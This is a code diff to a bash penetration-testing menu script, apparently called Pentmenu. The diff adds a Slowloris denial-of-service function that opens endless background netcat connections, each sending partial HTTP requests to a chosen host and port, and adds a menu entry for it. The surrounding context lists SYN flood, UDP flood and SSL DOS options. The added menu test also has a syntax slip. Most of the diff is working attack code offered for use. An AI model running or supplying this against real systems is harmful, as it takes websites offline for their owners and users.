@@ -1,7 +1,30 @@
 #!/bin/bash
 PS3="Pentmenu>"
+## create slowloris function
+slowloris()
+{ echo "Using netcat for Slowloris attack...."
+echo "Please note that this attack currently does not work against encrypted (HTTPS) sites" && sleep 1
+echo "Enter target:"
+	read TARGET
+echo "Target is set to $TARGET"
+echo "Enter target port (defaults to 80):"
+	read PORT
+	: ${PORT:=80}
+	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
+PORT=80 && echo "Invalid port, reverting to port 80"
+	fi
+	if [ "$PORT" -lt "1" ]; then
+PORT=80 && echo "Invalid port number chosen! Reverting port 80"
+	elif [ "$PORT" -gt "65535" ]; then
+PORT=80 && echo "Invalid port chosen! Reverting to port 80"
+	else echo "Using Port $PORT"
+	fi
+echo "Launching Slowloris....Use 'Ctrl c' to quit" && sleep 1
+	while :; do
+echo "Slowloris attack ongoing..."; echo -e "GET / HTTP/1.1\r\nHost:$TARGET\r\n$RANDOM: $RANDOM\r\n"|nc -i 59 --wait=300 $TARGET $PORT  2>/dev/null 1>/dev/null &
+	done
+}
 ## create UDP Flood function
-## UDP Flood DOS
 udpflood()
 { echo "UDP Flood uses hping3...checking for hping3..."
 if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
@@ -157,7 +180,7 @@ elif  [ "$PROTO" = "u" ] && [ "$PORT" -gt "1024" ]; then
 	fi
 }
 
-## define simple banner grabber
+## define simple banner grabber function
 bannergrab()
 { echo "Attempting to grab banners using netcat..."
 	echo "Enter target"
@@ -174,7 +197,7 @@ bannergrab()
 	echo "This software is only for responsible, authorised use."
 	echo "YOU are responsible for your own actions!"
 	echo ""
-	options=("Show IP" "TCP Port Scanner" "Banner Grabber" "TCP SYN Flood" "UDP Flood" "SSL DOS" "Create Listener" "Quit")
+	options=("Show IP" "TCP Port Scanner" "Banner Grabber" "TCP SYN Flood" "UDP Flood" "SSL DOS" "Slowloris" "Create Listener" "Quit")
 	select opt in "${options[@]}"; do
 ## quit 
 	if [ "$opt" = "Quit" ]; then
@@ -251,8 +274,12 @@ bannergrab()
 ## SSL DOS
 	elif [ "$opt" = "SSL DOS" ]; then
 		ssldos
+## UDP Flood		
  	elif [ "$opt" = "UDP Flood" ]; then
 		udpflood
+## Slowloris
+	elif [ "$opt" = "Slowloris"]; then
+		slowloris
 ## Default if no menu option selected is to return an error
 	else
   		echo  "That's not a valid option! Hit Return to show main menu"
